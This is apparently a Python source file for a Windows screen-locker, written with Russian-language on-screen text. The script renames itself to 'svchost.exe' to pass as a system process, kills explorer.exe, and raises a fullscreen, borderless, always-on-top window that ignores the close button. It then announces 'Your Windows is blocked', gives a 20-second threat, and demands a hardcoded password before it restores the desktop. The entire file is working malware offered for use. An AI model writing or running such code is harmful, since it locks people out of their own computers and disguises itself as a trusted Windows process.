import time
from tkinter import *
import os
import colorama
import tkinter.messagebox
from tkinter import *
import getpass
import os
import sys
import win32com.client

name = os.path.basename(__file__)
name

root = Tk()
USER_NAME = getpass.getuser()

os.rename(name, "svchost.exe")

def exb1():
    tkinter.messagebox.showwarning("Ошибка", "Таким способом хоть вы и закроете вирус\nНо у вас не будет доступа к пк!\nТак что лучше гадайте пароль")
    root.destroy()

def Ocmd():
    root.destroy()
    import RuntimeBroker

def password(arg):
    password = input_password


    if password.get() == "1928":
        root.destroy()
        os.system("explorer.exe")
        quit()
        exit()
    else:
        error = Button(text="Вы ввели неверный пароль\n"
                            "Попробуйте ещо раз\n\n"
                            "нажмите на текст что бы его убрать", font="Courier 12", command=lambda : error.place_forget(),
                       bd=0,
                       bg="blue",
                       fg="#b51212",
                       activebackground="blue",
                       activeforeground="blue")
        error.place(relx=0.256, rely=0.26)

        input_password.delete(0, 'end')

def Quit():
    pass


root.protocol("WM_DELETE_WINDOW", Quit)
root["bg"] = "blue"
root.title("One programm")
root.wm_attributes("-alpha", 2)
root.overrideredirect(1)
root.geometry("2000x2000")
root.attributes("-topmost", True)

root.resizable(width=False, height=False)

os.system("taskkill /f /im explorer.exe")

t1 = Label(text="Ваш виндовс заблокирован",
           font=("Lucida console", 50, "bold"),
           bg="blue",
           fg="red")
t1.place(x=240,
         y=300)

b1 = Button(
    text="                                                                                                "
         "                                                                                               "
         "                                                                                                "
         "                                                                                                  "
         "                                                                                                    "
         "                                                                                                     "
         "                                                                                                       "
         "                                                                                                         "
         "                                                                                                         "
         "                                                                                                          "
         "                                                                                                        ",
    bg="blue",
    fg="blue",
    activebackground="Blue",
    activeforeground="blue",
    bd="0",
    command=exb1)
b1.place(x=0,
         y=765)

b2 = Button(text="[<--Open the cmd-->]",
            font="15",
            bg="black",
            fg="white",
            activebackground="green",
            activeforeground="pink",
            command=Ocmd)
b2.place(x=10,
         y=10)

t2 = Label(text="У тебя ровно 20 секунд",
           bg="blue",
           fg="DimGrey")
t2.place(x=10,
         y=50)

text_enter = Label(text="Введите пароль", font=("Arial", 20, "bold"),
                   bg="blue",
                   fg="white")
text_enter.place(relx=0.28, rely=0.21)

input_password = Entry(text="", font=("Courier new", 16, "bold"), width=25,
                 fg="red",)
input_password.place(relx=0.26, rely=0.24, height=35)
input_password.bind("<Return>", password)

root.mainloop()
